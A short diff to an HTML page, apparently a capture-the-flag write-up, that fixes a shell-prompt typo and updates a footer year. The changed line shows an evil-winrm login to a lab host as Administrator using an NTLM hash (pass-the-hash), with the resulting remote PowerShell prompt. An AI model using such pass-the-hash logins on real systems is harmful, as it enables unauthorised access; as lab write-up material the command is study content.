-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>
 
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
 </pre></div>
@@ -544,7 +544,7 @@ Since the user is Administrator, we can access the system using Evil-WinRM by di
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
